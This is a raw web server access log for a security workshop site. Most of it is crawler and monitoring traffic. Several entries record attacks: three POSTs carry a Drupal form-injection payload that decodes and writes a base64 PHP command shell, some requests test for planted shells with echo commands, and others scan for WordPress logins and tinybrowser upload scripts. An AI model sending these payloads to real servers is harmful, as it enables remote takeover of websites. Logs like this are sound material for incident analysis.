www.nspw.org:80 59.124.153.166 - - [01/May/2018:19:12:28 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 105.157.247.53 - - [01/May/2018:19:13:29 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 216.244.66.200 - - [01/May/2018:19:13:38 -0400] "GET /2006/panel.html HTTP/1.1" 302 503 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 105.157.247.53 - - [01/May/2018:19:13:42 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 109.13.86.242 - - [01/May/2018:19:13:51 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 109.13.86.242 - - [01/May/2018:19:13:53 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:19:15:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 82.102.21.230 - - [01/May/2018:19:19:44 -0400] "GET /node/70 HTTP/1.1" 302 543 "http://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:19:20:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 157.55.39.122 - - [01/May/2018:19:21:01 -0400] "GET /papers/2004/nspw2004-gates.pdf HTTP/1.1" 302 589 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 185.243.113.119 - - [01/May/2018:19:21:22 -0400] "GET /s.php?c=echo+%24%28%281714%2B1714%2A4%29%29 HTTP/1.1" 302 617 "-" "python-requests/2.12.4"
www.nspw.org:80 185.243.113.119 - - [01/May/2018:19:21:23 -0400] "GET /sites/default/s.php?c=echo+%24%28%281714%2B1714%2A4%29%29 HTTP/1.1" 302 645 "-" "python-requests/2.12.4"
www.nspw.org:80 185.243.113.119 - - [01/May/2018:19:21:24 -0400] "GET /sites/default/files/s.php?c=echo+%24%28%281714%2B1714%2A4%29%29 HTTP/1.1" 302 657 "-" "python-requests/2.12.4"
www.nspw.org:80 185.243.113.119 - - [01/May/2018:19:21:25 -0400] "GET /sites/default/files/default.php?c=echo+%24%28%281714%2B1714%2A4%29%29 HTTP/1.1" 302 669 "-" "python-requests/2.12.4"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:19:24:08 -0400] "GET /current/cfp.shtml HTTP/1.1" 302 563 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:19:25:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 128.110.39.93 - - [01/May/2018:19:25:39 -0400] "GET /papers/2007/nspw2007-somayaji.pdf HTTP/1.1" 302 595 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
www.nspw.org:80 40.77.167.65 - - [01/May/2018:19:26:20 -0400] "GET /2009/proceedings/1997/nspw1997-mambo.pdf HTTP/1.1" 302 609 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 180.76.15.147 - - [01/May/2018:19:26:25 -0400] "GET /robots.txt HTTP/1.1" 302 508 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
www.nspw.org:80 180.76.15.135 - - [01/May/2018:19:26:26 -0400] "GET /robots.txt HTTP/1.1" 302 508 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
www.nspw.org:80 180.76.15.145 - - [01/May/2018:19:26:37 -0400] "GET /papers/1993/?C=M;O=A HTTP/1.1" 302 528 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 199.59.150.183 - - [01/May/2018:19:27:30 -0400] "GET /robots.txt HTTP/1.1" 302 489 "-" "Twitterbot/1.0"
www.nspw.org:80 199.59.150.183 - - [01/May/2018:19:27:31 -0400] "GET /2018/cfp HTTP/1.1" 302 485 "-" "Twitterbot/1.0"
www.nspw.org:80 76.66.92.205 - - [01/May/2018:19:28:32 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 76.66.92.205 - - [01/May/2018:19:28:35 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 160.179.109.214 - - [01/May/2018:19:29:49 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 160.179.109.214 - - [01/May/2018:19:29:50 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 152.168.110.170 - - [01/May/2018:19:30:21 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 152.168.110.170 - - [01/May/2018:19:30:22 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:19:30:33 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 185.243.113.119 - - [01/May/2018:19:33:20 -0400] "GET /s.php?c=echo+%24%28%281714%2B1714%2A4%29%29 HTTP/1.1" 302 617 "-" "python-requests/2.12.4"
www.nspw.org:80 185.243.113.119 - - [01/May/2018:19:33:20 -0400] "GET /sites/default/s.php?c=echo+%24%28%281714%2B1714%2A4%29%29 HTTP/1.1" 302 645 "-" "python-requests/2.12.4"
www.nspw.org:80 185.243.113.119 - - [01/May/2018:19:33:21 -0400] "GET /sites/default/files/s.php?c=echo+%24%28%281714%2B1714%2A4%29%29 HTTP/1.1" 302 657 "-" "python-requests/2.12.4"
www.nspw.org:80 185.243.113.119 - - [01/May/2018:19:33:22 -0400] "GET /sites/default/files/default.php?c=echo+%24%28%281714%2B1714%2A4%29%29 HTTP/1.1" 302 669 "-" "python-requests/2.12.4"
www.nspw.org:80 40.77.167.65 - - [01/May/2018:19:34:17 -0400] "GET /2009/proceedings/2002/nspw2002-capkun.pdf HTTP/1.1" 302 611 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:19:35:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 157.55.39.122 - - [01/May/2018:19:36:37 -0400] "GET /papers/2010/nspw2010-raskin.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 180.76.15.20 - - [01/May/2018:19:37:00 -0400] "GET /2017/organizers HTTP/1.1" 302 533 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 59.124.153.166 - - [01/May/2018:19:38:03 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 35.171.8.48 - - [01/May/2018:19:39:48 -0400] "GET /papers/2007/nspw2007-locasto.pdf HTTP/1.1" 302 593 "-" "python-requests/2.18.4"
www.nspw.org:80 62.202.181.215 - - [01/May/2018:19:40:02 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 62.202.181.215 - - [01/May/2018:19:40:03 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:19:40:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 180.76.15.147 - - [01/May/2018:19:41:53 -0400] "GET /user/password HTTP/1.1" 302 518 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 54.36.148.135 - - [01/May/2018:19:42:01 -0400] "GET /2005/ HTTP/1.1" 302 483 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 180.76.15.17 - - [01/May/2018:19:42:53 -0400] "GET /proceedings HTTP/1.1" 302 514 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 199.16.157.183 - - [01/May/2018:19:43:09 -0400] "GET /2018/cfp HTTP/1.1" 302 485 "-" "Twitterbot/1.0"
www.nspw.org:80 180.76.15.27 - - [01/May/2018:19:43:53 -0400] "GET /2009/proceedings/2009/?C=S;O=A HTTP/1.1" 302 552 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 180.76.15.16 - - [01/May/2018:19:44:53 -0400] "GET /papers/2009/?C=M;O=D HTTP/1.1" 302 532 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:19:45:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 58.178.76.80 - - [01/May/2018:19:45:44 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 58.178.76.80 - - [01/May/2018:19:45:48 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 180.76.15.21 - - [01/May/2018:19:45:53 -0400] "GET /2015/cfp/nspw2015-cfp.pdf HTTP/1.1" 302 542 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 180.23.174.51 - - [01/May/2018:19:46:37 -0400] "GET /2018 HTTP/1.1" 302 500 "-" "LWP::Simple/6.29 libwww-perl/6.29"
www.nspw.org:80 71.94.177.130 - - [01/May/2018:19:46:48 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 71.94.177.130 - - [01/May/2018:19:46:48 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 180.76.15.139 - - [01/May/2018:19:46:53 -0400] "GET /papers/2005/nspw2005-beznosov.pdf HTTP/1.1" 302 558 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 157.55.39.252 - - [01/May/2018:19:47:06 -0400] "GET /papers/2009/nspw2009-verendel.pdf HTTP/1.1" 302 595 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 185.232.20.242 - - [01/May/2018:19:47:15 -0400] "GET /user/login HTTP/1.1" 302 489 "http://nspw.org/user/login" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"
www.nspw.org:80 185.232.20.242 - - [01/May/2018:19:47:16 -0400] "GET /user/login HTTP/1.1" 302 489 "http://nspw.org/user/login" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"
www.nspw.org:80 185.232.20.242 - - [01/May/2018:19:47:16 -0400] "GET /user/login HTTP/1.1" 302 489 "http://nspw.org/user/login" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"
www.nspw.org:80 54.70.40.11 - - [01/May/2018:19:47:18 -0400] "GET /current/ HTTP/1.1" 302 489 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
www.nspw.org:80 180.76.15.25 - - [01/May/2018:19:47:53 -0400] "GET /2009/proceedings/2002/nspw2002-taylor.pdf HTTP/1.1" 302 574 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 54.70.40.11 - - [01/May/2018:19:48:18 -0400] "GET /2013 HTTP/1.1" 302 481 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
www.nspw.org:80 180.76.15.151 - - [01/May/2018:19:48:53 -0400] "GET /2009/proceedings/2007/nspw2007-chow.pdf HTTP/1.1" 302 570 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 54.70.40.11 - - [01/May/2018:19:49:30 -0400] "GET /2012 HTTP/1.1" 302 481 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
www.nspw.org:80 180.76.15.23 - - [01/May/2018:19:49:53 -0400] "GET /papers/2002/nspw2002-capkun.pdf HTTP/1.1" 302 554 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:19:50:45 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 187.113.21.52 - - [01/May/2018:19:52:02 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 187.113.21.52 - - [01/May/2018:19:52:05 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 216.244.66.200 - - [01/May/2018:19:52:24 -0400] "GET /2007/cfp/?C=N;O=A HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 168.205.179.52 - - [01/May/2018:19:52:36 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 168.205.179.52 - - [01/May/2018:19:52:40 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 66.249.73.80 - - [01/May/2018:19:54:46 -0400] "GET /papers/2009/nspw2009-herley.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:19:55:45 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 216.244.66.200 - - [01/May/2018:19:59:36 -0400] "GET /2003/hold/papers.shtml HTTP/1.1" 302 517 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 180.76.15.17 - - [01/May/2018:19:59:58 -0400] "GET /papers/2000/nspw2000-rannenberg.pdf HTTP/1.1" 302 562 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:20:00:45 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 77.75.79.54 - - [01/May/2018:20:00:54 -0400] "GET /robots.txt HTTP/1.1" 302 549 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.79.54 - - [01/May/2018:20:01:01 -0400] "GET /2006/program.content HTTP/1.1" 302 569 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.79.54 - - [01/May/2018:20:01:01 -0400] "GET /2008/oc.shtml HTTP/1.1" 302 554 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.79.54 - - [01/May/2018:20:01:02 -0400] "GET /2013/program HTTP/1.1" 302 552 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.79.54 - - [01/May/2018:20:01:02 -0400] "GET /2003/hold/ HTTP/1.1" 302 548 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 59.124.153.166 - - [01/May/2018:20:03:46 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 216.244.66.200 - - [01/May/2018:20:04:52 -0400] "GET /2005/program.shtml HTTP/1.1" 302 509 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 114.109.48.86 - - [01/May/2018:20:05:37 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 114.109.48.86 - - [01/May/2018:20:05:38 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:20:05:45 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 52.207.240.171 - - [01/May/2018:20:06:16 -0400] "GET /2018 HTTP/1.1" 302 481 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0 (FlipboardProxy/1.2; +http://flipboard.com/browserproxy)"
www.nspw.org:80 160.20.252.243 - - [01/May/2018:20:06:48 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:20:06:58 -0400] "GET /wwwroot/addons/tinymce/plugins/tinybrowser/upload.php HTTP/1.1" 302 631 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:20:06:58 -0400] "GET /public/js/tiny_mce/plugins/tinybrowser/upload.php HTTP/1.1" 302 567 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:20:06:58 -0400] "GET /js/tinymce/plugins/tinybrowser/upload.php HTTP/1.1" 302 551 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:20:06:59 -0400] "GET /tinybrowser/tree/tinybrowser/upload.php HTTP/1.1" 302 547 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:20:06:59 -0400] "GET /flikQ/rocketeercms/blob/master/themes/admin/assets/js/tiny_mce/plugins/tinybrowser/upload.php HTTP/1.1" 302 655 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:20:06:59 -0400] "GET /scripts/tiny_mce/plugins/tinybrowser/upload.php HTTP/1.1" 302 563 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:20:06:59 -0400] "GET /painel/scripts/tiny_mce/plugins/tinybrowser/upload.php HTTP/1.1" 302 577 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:20:06:59 -0400] "GET /tinymce_pt/jscripts/tiny_mce/plugins/tinybrowser/upload.php HTTP/1.1" 302 587 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:20:07:00 -0400] "GET /php/tinybrowser/upload.php HTTP/1.1" 302 521 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:20:07:00 -0400] "GET /jscripts/tiny_mce/plugins/tinybrowser/upload.php HTTP/1.1" 302 565 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:20:07:00 -0400] "GET /tiny_mce/plugins/tinybrowser/upload.php HTTP/1.1" 302 547 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:20:07:01 -0400] "GET /wp-content/plugins/simple-forum/editors/tinymce/plugins/tinybrowser/upload.php HTTP/1.1" 302 625 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:20:07:01 -0400] "GET /Association/wp-content/plugins/simple-forum/editors/tinymce/plugins/tinybrowser/upload.php HTTP/1.1" 302 649 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:20:07:01 -0400] "GET /js/tiny_mce/plugins/tinybrowser/upload.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:20:07:01 -0400] "GET /bd/search?q=health/plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/upload.php HTTP/1.1" 302 651 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:20:07:02 -0400] "GET /tinybrowser/upload.php HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:20:07:02 -0400] "GET /plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/upload.php HTTP/1.1" 302 613 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:20:07:02 -0400] "GET /public/javascripts/tiny_mce/plugins/tinybrowser/upload.php HTTP/1.1" 302 585 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 36.110.211.42 - - [01/May/2018:20:07:02 -0400] "GET / HTTP/1.1" 302 529 "http://www.so.com/" "Mozilla/5.0 (Windows NT 6.2; rv:30.0) Gecko/20150101 Firefox/32.0 360Spider 360Spider"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:20:07:03 -0400] "GET /cat-bin/tools/login/lib/tiny_mce/plugins/tinybrowser/upload.php HTTP/1.1" 302 595 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:20:07:03 -0400] "GET /admin/lib/tiny_mce/plugins/tinybrowser/upload.php HTTP/1.1" 302 567 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:20:07:03 -0400] "GET /static/js/tiny_mce/plugins/tinybrowser/upload.php HTTP/1.1" 302 567 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:20:07:03 -0400] "GET /editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/upload.php HTTP/1.1" 302 597 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:20:07:04 -0400] "GET /projects/bilardII/resources/js/tiny_mce/plugins/tinybrowser/upload.php HTTP/1.1" 302 609 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 ::1 - - [01/May/2018:20:07:11 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [01/May/2018:20:07:12 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [01/May/2018:20:07:13 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 216.244.66.200 - - [01/May/2018:20:08:32 -0400] "GET /2017/dates HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 199.16.157.182 - - [01/May/2018:20:08:32 -0400] "GET /robots.txt HTTP/1.1" 302 489 "-" "Twitterbot/1.0"
www.nspw.org:80 199.16.157.182 - - [01/May/2018:20:08:33 -0400] "GET /2018/cfp HTTP/1.1" 302 485 "-" "Twitterbot/1.0"
www.nspw.org:80 180.76.15.18 - - [01/May/2018:20:10:20 -0400] "GET /node/53 HTTP/1.1" 302 517 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:20:10:45 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
